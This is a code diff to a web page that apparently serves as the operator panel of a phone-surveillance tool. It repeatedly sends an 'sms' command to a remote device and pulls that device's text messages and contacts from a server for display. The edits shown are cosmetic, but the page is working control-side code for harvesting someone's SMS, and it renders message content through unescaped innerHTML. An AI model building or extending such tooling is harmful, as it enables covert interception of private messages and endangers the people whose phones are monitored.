@@ -93,7 +93,7 @@
             padding: 14px;
             border-radius: 18px;
             position: relative;
-            animation: fadeIn 0.3s ease;
+            /* Animation HATA DIYA gaya hai taaki shake na ho */
         }
 
         .sms-header {
@@ -113,11 +113,6 @@
         .message-body {
             font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
             word-wrap: break-word;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
@@ -155,7 +150,7 @@
 
     let allSMSData = []; 
     let contactMap = {}; 
-    let isFetching = false; // Prevent overlapping requests
+    let isFetching = false; 
 
     document.addEventListener("DOMContentLoaded", function() {
         if (!DEVICE_ID) {
@@ -166,11 +161,9 @@
         prepareContactMap();
         loadFromStorage();
         
-        // --- ⚡ START LIVE UPDATES ---
         startLiveSystem();
     });
 
-    // 1. Phone Numbers ka Naam dhoondhne wala map
     function prepareContactMap() {
         const savedContacts = localStorage.getItem(storageKeyContacts);
         if (savedContacts) {
@@ -198,16 +191,11 @@
         }
     }
 
-    // 2. LIVE SYSTEM LOGIC 
+    // --- LIVE SYSTEM ---
     function startLiveSystem() {
-        // Pehli baar turant run karo
         sendCommand();
         fetchSMS();
-
-        // Har 10 second mein phone ko bolo "SMS bhej"
         setInterval(sendCommand, 10000);
-
-        // Har 3 second mein server se naya data check karo
         setInterval(fetchSMS, 3000);
     }
 
@@ -216,28 +204,26 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
-        }).catch(() => {}); // Silent catch error
+        }).catch(() => {}); 
     }
 
     function fetchSMS() {
-        if(isFetching) return; // Agar pehla request chal raha hai to ruk jao
+        if(isFetching) return;
         isFetching = true;
 
         fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
             .then(res => res.json())
             .then(data => {
                 if (data && data.length > 0) {
-                    // Check karo kya naya data purane se alag hai? (Optimization)
                     if (JSON.stringify(data) !== JSON.stringify(allSMSData)) {
                         allSMSData = data;
                         localStorage.setItem(storageKeySMS, JSON.stringify(data));
                         
-                        // Agar search bar khali hai tabhi update karo taaki user disturb na ho
                         const query = document.getElementById('searchInput').value;
                         if(query === "") {
                             renderSMS(allSMSData);
                         } else {
-                            filterSMS(); // Agar search kar raha hai to filter apply karo
+                            filterSMS();
                         }
                     }
                 }
@@ -257,6 +243,7 @@
         renderSMS(filtered);
     }
 
+    // --- STABLE RENDER FUNCTION (FIXED) ---
     function renderSMS(data) {
         const listContainer = document.getElementById("sms-list");
         
@@ -265,18 +252,20 @@
             return;
         }
 
-        const displayData = data.slice(0, 100); // Top 100 messages
+        // 🔥 FIX: Current Scroll position save karo
+        const scrollPos = window.scrollY;
+
+        const displayData = data.slice(0, 100); 
 
         const htmlString = displayData.map(sms => {
             const name = getContactName(sms.address);
             const isSaved = name !== sms.address;
             
-            // --- DATE & TIME FORMATTING ---
             let formattedDate = "";
             if (!isNaN(sms.date)) {
                 const d = new Date(parseInt(sms.date));
-                const datePart = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }); // Oct 24
-                const timePart = d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }); // 10:30 AM
+                const datePart = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }); 
+                const timePart = d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }); 
                 formattedDate = `${datePart}, ${timePart}`;
             }
 
@@ -297,6 +286,9 @@
         }).join('');
 
         listContainer.innerHTML = htmlString;
+
+        // 🔥 FIX: Scroll wapas wahi set karo jaha tha
+        window.scrollTo(0, scrollPos);
     }
 </script>
 </body>
